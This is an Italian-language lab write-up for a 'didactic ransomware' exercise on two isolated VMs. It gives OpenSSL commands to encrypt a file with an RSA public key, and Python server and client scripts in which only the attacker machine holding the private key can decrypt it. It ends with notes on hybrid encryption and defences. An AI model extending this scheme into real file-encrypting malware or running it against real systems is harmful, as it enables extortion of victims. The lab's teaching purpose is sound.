# Lab 05 — Ransomware RSA

## Disclaimer
Progetto esclusivamente educativo in ambiente isolato. Uso al di fuori del laboratorio è illegale.

## Obiettivo
Sviluppare un ransomware didattico che cifra file con RSA-OAEP per comprendere il funzionamento interno di questo tipo di malware.

## Ambiente
| VM | IP | Ruolo |
|---|---|---|
| Kali Linux | 10.0.2.6 | Server (chiave privata) |
| Lubuntu | 10.0.2.15 | Vittima (chiave pubblica) |

## Comandi OpenSSL — generazione chiavi su Kali
```bash
openssl genrsa -out pub_priv_pair.key 2048
openssl rsa -in pub_priv_pair.key -pubout -out public.key
```

## Cifratura file su Lubuntu
```bash
openssl pkeyutl -encrypt -inkey public.key -pubin \
        -in plaintext.txt -out cipher.bin \
        -pkeyopt rsa_padding_mode:oaep
```

## Server Python su Kali
```python
import socketserver, subprocess

class ClientHandler(socketserver.BaseRequestHandler):
    def handle(self):
        encrypted_data = self.request.recv(4096)
        with open("cipher.bin", "wb") as f:
            f.write(encrypted_data)
        subprocess.run(["openssl", "base64", "-in", "cipher.bin", "-out", "cipher64.txt"])
        subprocess.run(["openssl", "base64", "-d", "-in", "cipher64.txt", "-out", "cipher64.bin"])
        subprocess.run([
            "openssl", "pkeyutl", "-decrypt",
            "-inkey", "pub_priv_pair.key",
            "-in", "cipher64.bin",
            "-out", "plainD.txt",
            "-pkeyopt", "rsa_padding_mode:oaep"
        ])
        with open("plainD.txt", "rb") as f:
            self.request.sendall(f.read())

server = socketserver.TCPServer(("0.0.0.0", 8082), ClientHandler)
server.serve_forever()
```

## Client Python su Lubuntu
```python
import socket

with socket.create_connection(("10.0.2.6", 8082)) as sock:
    with open("cipher.bin", "rb") as f:
        sock.sendall(f.read())
    decrypted = b""
    while True:
        part = sock.recv(4096)
        if not part:
            break
        decrypted += part
    with open("plainD.txt", "wb") as f:
        f.write(decrypted)
print("File decifrato ricevuto: plainD.txt")
```

## Risultati
- File cifrato su Lubuntu con chiave pubblica
- Solo Kali con chiave privata può decifrarlo
- Lubuntu riceve il plaintext senza mai avere la chiave privata

## Concetti chiave
- Ransomware reali usano cifratura ibrida: AES per i file, RSA per la chiave AES
- Padding OAEP aggiunge entropia casuale — ogni cifratura produce output diverso
- Difesa: backup offline 3-2-1, EDR, principio del minimo privilegio
